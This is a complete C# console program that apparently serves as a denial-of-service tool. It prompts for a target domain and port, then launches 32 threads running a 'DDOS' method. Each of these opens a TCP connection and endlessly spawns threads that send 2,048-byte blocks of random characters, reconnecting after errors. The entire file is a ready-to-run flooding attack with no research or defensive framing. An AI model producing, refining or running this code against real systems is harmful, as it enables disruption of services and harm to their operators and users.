using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

class Program
{
    public static string? IP;
    public static int Port;
    public static int count = 0;
    public static int isErr = 0;
    public static Socket? socket;
    static async Task Main()
    {
        Console.Clear();
        Console.Write("服务器 |  Server: ");
        bool isDomainName = false;
        string DomainPattern = @"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z0-9]{0,}$";
        Regex ymregex = new Regex(DomainPattern);
        while (!isDomainName)
        {
            IP = Console.ReadLine();
            isDomainName = ymregex.IsMatch(IP);
            if (!isDomainName)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n非法地址 | Invalid input");
                Console.ResetColor();
            }
        }
        while (true)
        {
            Console.Write("端口   |  Port  : ");
            if (int.TryParse(Console.ReadLine(), out Port))
            {
                break;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n非法端口 | Invalid input");
                Console.ResetColor();
            }
        }
        for (int i = 0; i < 32; i++)
        {
            Thread t = new(DDOS);
            t.Start();
        }
    }
    static void DDOS()
    {
    reclient:
        socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        socket.Connect(IP, Port);
        while (true)
        {
            count++;

            Thread s = new(SendPackage);
            s.Start();
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("OK");
            Console.ResetColor();
            Console.Write("\u0020time ="+ count);

            if(isErr == 1)
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("错误: ERROR At\u0020" + count + "\u0020turns.");
                Console.ResetColor();
                socket = null;
                isErr = 0;
                goto reclient;
            }
        }
    }
    static void SendPackage()
    {
        int rs = 2048;
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
        StringBuilder rd = new(rs);
        Random random = new();
        for (int i = 0; i < rs; i++)
        {
            rd.Append(chars[random.Next(chars.Length)]);
        }
        byte[] data = Encoding.UTF8.GetBytes(rd.ToString());

        try
        {
            socket.Send(data);
            isErr = 0;
            return;
        }
        catch(Exception)
        {
            isErr = 1;
            return;
        }
    }
}
